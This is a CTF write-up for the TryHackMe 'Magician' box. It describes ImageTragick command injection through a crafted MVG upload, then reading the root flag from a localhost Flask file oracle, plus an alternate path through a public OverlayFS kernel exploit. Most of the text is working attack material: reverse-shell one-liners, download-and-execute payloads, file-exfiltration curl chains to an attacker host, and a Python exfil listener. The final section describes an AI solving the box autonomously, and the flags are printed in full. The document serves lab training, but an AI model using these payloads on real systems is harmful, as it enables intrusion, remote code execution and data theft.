# 🎩 Magician

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/magician)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com/room/magician)
[![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)](https://tryhackme.com/room/magician)
[![Type](https://img.shields.io/badge/Type-Boot2Root-blue?style=for-the-badge)](https://tryhackme.com/room/magician)

| | |
|---|---|
| **Target** | `10.49.174.50` |
| **OS** | Linux (Ubuntu 18.04) |
| **Attack Surface** | FTP, HTTP (Spring Boot :8080, nginx :8081) |
| **Privesc** | SSRF to locally-bound Flask oracle on port 6666 |

The FTP banner hints at ImageTragick. The Spring Boot app on port 8080 converts PNG files using ImageMagick. Uploading a crafted MVG file triggers CVE-2016-3714, giving RCE as `magician`. A hint file in the home directory points to a Flask app bound to 127.0.0.1:6666 — it reads any file on disk and hands over the root flag.

> This writeup has two paths. **Human + AI assisted** — the main writeup below — is where the human drove and the AI helped. **Autonomous AI** — the section at the bottom — is where the AI solved the box independently with no interactive shell, using only HTTP exfil.

---

## 👤 Human + AI Assisted Path

---

## 🔍 Enumeration

### Port Scan

Run a fast port scan to find open services.

```bash
rustscan -a 10.49.174.50 --ulimit 5000 -b 4500 -t 1500
nmap -sV -sC -p 21,8080,8081 10.49.174.50
```

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
8080/tcp open  http    Apache Tomcat (Spring Boot)
8081/tcp open  http    nginx 1.14.0 (Ubuntu)
```

### FTP Anonymous Login

Connect as anonymous to read the banner.

```bash
ftp 10.49.174.50
# username: anonymous  password: anonymous
```

```text
220 THE MAGIC DOOR
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya,
it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;)
Since you're a rookie, this might help you to get started: https://imagetragick.com.
You might need to do some little tweaks though...
230 Login successful.

ftp> ls
550 Permission denied.
```

The banner names the CVE. Directory listing is denied so FTP has nothing else.

### Web App — Port 8080 (Spring Boot)

Check what endpoints the backend exposes.

```bash
ffuf -u http://magician:8080/FUZZ \
     -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
     -ic -fc 403
```

```text
files    [Status: 200]
upload   [Status: 405]   ← POST only
```

```bash
curl http://magician:8080/files
```

```json
[{"name":"trag1.jpg","url":"http://magician:8080/files/trag1.jpg"}, ...]
```

The `/upload` endpoint accepts PNG files and converts them to JPEG via ImageMagick.

---

## 💀 Initial Access

**CVE-2016-3714 (ImageTragick)** — ImageMagick passes the URL inside `fill 'url(...)'` in an MVG file directly to a shell delegate without sanitisation. Break out of the URL string with `"` to inject commands.

**Rules for the injected command:**
- No `|` inside the command — it acts as a pipe delimiter and closes the injection
- No `>` shell redirect — it creates empty files in this context
- Use `;` or `&&` to chain commands
- Download a script with `curl -o` then execute it — avoids all the above

### What didn't work

```
# bash /dev/tcp — sh interprets >& as ambiguous redirect
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/LHOST/443 0>&1 #|touch "hello)'

# pipe to sh — | closes the injection
fill 'url(https://127.0.0.1/test.jpg"|curl http://LHOST:8000/shell.sh|sh #|touch "hello)'

# mkfifo + nc — raw TCP outbound blocked
fill 'url(https://127.0.0.1/test.jpg"|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f #|touch "hello)'
```

### What worked — download and exec

Create `shell.sh` and serve it from your machine.

```bash
# shell.sh
bash -i >& /dev/tcp/LHOST/443 0>&1
```

```bash
# On attacker — serve the file
python3 -m http.server 8000

# On attacker — catch the shell
sudo nc -nlvp 443
```

Write the MVG payload into a file named `test.png`. ImageMagick processes the content regardless of extension — the `image/png` content type satisfies the upload filter.

```
# test.png  (MVG content, sent as image/png)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|curl http://LHOST:8000/shell.sh -o /tmp/s && sh /tmp/s #|touch "hello)'
pop graphic-context
```

Upload via the frontend at `http://magician:8081/`. The Vue.js SPA POSTs to `magician:8080/upload` with `Content-Type: multipart/form-data`.

```http
POST /upload HTTP/1.1
Host: magician:8080
Origin: http://magician:8081
Content-Type: multipart/form-data; boundary=----geckoformboundary...

------geckoformboundary...
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|curl http://LHOST:8000/shell.sh -o /tmp/s && sh /tmp/s #|touch "hello)'
pop graphic-context
------geckoformboundary...--
```

```text
connect to [LHOST] from (UNKNOWN) [10.49.174.50] 36812
sh: no job control in this shell
sh-4.4$
```

Upgrade to a full TTY.

```bash
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
stty rows 82 cols 97
export TERM=xterm
```

---

## 🔁 Privilege Escalation

### Enumerate from the shell

```bash
magician@magician:~$ id
uid=1000(magician) gid=1000(magician) groups=1000(magician)

magician@magician:~$ sudo -l
[sudo] password for magician:    # no sudo without password

magician@magician:~$ cat user.txt
THM{***********************}

magician@magician:~$ cat the_magic_continues
The magician is known to keep a locally listening cat up his sleeve,
it is said to be an oracle who will tell you secrets if you are
good enough to understand its meows.
```

Check for localhost-only services.

```bash
magician@magician:~$ ss -ntl
State    Local Address:Port
LISTEN   127.0.0.1:6666        ← localhost only
LISTEN   0.0.0.0:8081
LISTEN   0.0.0.0:8080
LISTEN   *:21
```

### Talk to the oracle

GET the service to see what it is.

```bash
magician@magician:~$ curl http://127.0.0.1:6666
# Returns a Flask form: "Enter filename"
```

POST the root flag path.

```bash
magician@magician:/tmp$ curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"
```

The response body contains a hex string inside `<pre>`.

```text
54484d7b6d616769635f6d61795f6d616b655f6d616e795f6d656e5f6d61647d0a
```

Decode it.

```bash
echo 54484d7b6d616769635f6d61795f6d616b655f6d616e795f6d656e5f6d61647d0a | xxd -r -p
```

```text
THM{***************************}
```

---

## 💣 Unintended — CVE-2021-3493 (Ubuntu OverlayFS LPE)

> Screw the authors aye. No time for magic tricks. *mad macho man munches magic machines*

The kernel is 4.15.0-135-generic (Ubuntu 18.04). CVE-2021-3493 is an OverlayFS privilege escalation that gives root directly — no enumeration needed.

Download, compile, and run.

```bash
# On attacker
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
gcc exploit.c -o exploit
python3 -m http.server 8000
```

```bash
# On target
magician@magician:/tmp$ wget http://LHOST:8000/exploit
magician@magician:/tmp$ chmod +x ./exploit
magician@magician:/tmp$ ./exploit
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root)

bash-4.4# cat /root/root.txt
THM{***************************}
```

Root's home had the Flask source at `/root/flask/` and the ImageMagick source at `/root/ImageMagick/`.

---

## 🗺️ Attack Chain

```
[Attacker]
    |
    | nmap/rustscan — ports 21, 8080, 8081
    v
[FTP :21]
    |
    | anonymous login → banner: imagetragick.com
    v
[Spring Boot :8080 — /upload]
    |
    | MVG payload: curl -o /tmp/s && sh /tmp/s
    | nc listener on 443
    v
[shell as magician]
    |
    | cat user.txt
    v
[user.txt — THM{***********************}]
    |
    | cat the_magic_continues → "locally listening cat"
    | ss -ntl → 127.0.0.1:6666
    | curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"
    | xxd -r -p (hex decode)
    v
[root.txt — THM{***************************}]

--- OR (unintended) ---

[shell as magician]
    |
    | wget CVE-2021-3493 exploit → compile → run
    v
[root — THM{***************************}]
```

---

## 📌 Key Takeaways

- Read every FTP banner. This one names the CVE and the target library outright.
- Never use `|` inside an ImageTragick injected command — it closes the injection delimiter. Chain with `&&` or `;` instead.
- The download-then-exec pattern (`curl -o /tmp/s && sh /tmp/s`) sidesteps pipe and redirect restrictions cleanly.
- Run `ss -ntl` after getting a shell to find services bound only to localhost.
- The magic cat encodes its output in hex. Decode with `xxd -r -p`.

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Scanning IP Blocks | [T1595.001](https://attack.mitre.org/techniques/T1595/001) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
| Discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046) |
| Collection | Data from Local System | [T1005](https://attack.mitre.org/techniques/T1005) |
| Lateral Movement | Exploitation of Remote Services (internal SSRF) | [T1210](https://attack.mitre.org/techniques/T1210) |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `rustscan` / `nmap` | Port and service discovery |
| `ffuf` | Web directory brute-forcing |
| `curl` | Payload delivery and oracle interaction |
| `nc` | Reverse shell listener |
| `python3 -m http.server` | Serve shell.sh to the target |
| `xxd` | Hex decode the flag |

---

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`THM{simsalabim_hex_hex}`

</details>

<details>
<summary><code>root.txt</code></summary>

`THM{magic_may_make_many_men_mad}`

</details>

---

## 🤖 Autonomous AI Path — SSRF-Only (no interactive shell)

> The AI solved this box independently with zero human input after the initial target IP. No interactive shell was ever obtained. Both flags were captured by chaining curl requests through the ImageTragick injection alone.

### Why no shell?

Raw TCP outbound is blocked from the container. Bash `/dev/tcp`, `nc`, and Python socket reverse shells all fail. Only HTTP outbound works. The AI used the injection itself as the execution primitive — downloading and running scripts with `nohup bash script &` to detach from the pipe stdin.

### SSRF file read pattern

Two-curl chain: read the file with `curl file://`, write to `/tmp`, then POST the contents back.

```bash
# Template
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.png"|curl -s file:///TARGET -o /tmp/r.txt;curl -s --data-binary @/tmp/r.txt http://LHOST:9998/LABEL|")'
pop graphic-context
```

### Script execution pattern

Bash subprocesses spawned from the injection read stdin from the injection pipe and hang. Detach with `nohup ... &`.

```bash
# Template
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.png"|curl -s http://LHOST:9998/script.sh -o /tmp/s.sh;nohup bash /tmp/s.sh &|")'
pop graphic-context
```

The listener on port 9998 handles both GET (serve scripts) and POST (receive exfil):

```python
# listener.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

SERVE_DIR = "/tmp/ssrf_results"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        path = self.path.strip('/')
        with open(f"{SERVE_DIR}/{path}_.txt", 'wb') as f:
            f.write(body)
        print(f"[POST] {self.path} ({length} bytes)", flush=True)
        print(body.decode(errors='replace')[:1000], flush=True)
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        filepath = os.path.join(SERVE_DIR, self.path.strip('/'))
        if os.path.exists(filepath):
            data = open(filepath, 'rb').read()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 9998), Handler).serve_forever()
```

### Finding port 6666 without a shell

Read `/proc/net/tcp` and decode the hex addresses manually. Each `local_address` field is little-endian hex `IP:PORT`.

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.png"|curl -s file:///proc/net/tcp -o /tmp/r.txt;curl -s --data-binary @/tmp/r.txt http://LHOST:9998/nettcp|")'
pop graphic-context
```

```text
0: 0100007F:1A0A  →  127.0.0.1 : 0x1A0A = 6666  (LISTEN)
```

### Reading root.txt via the oracle

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.png"|curl -s -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt" -o /tmp/r.txt;curl -s --data-binary @/tmp/r.txt http://LHOST:9998/rootflag|")'
pop graphic-context
```

The oracle returned the flag ROT13-encoded in the AI session (vs hex when accessed from a real shell). Decode with:

```bash
echo "GUZ{zntvp_znl_znxr_znal_zra_znq}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# THM{***************************}
```
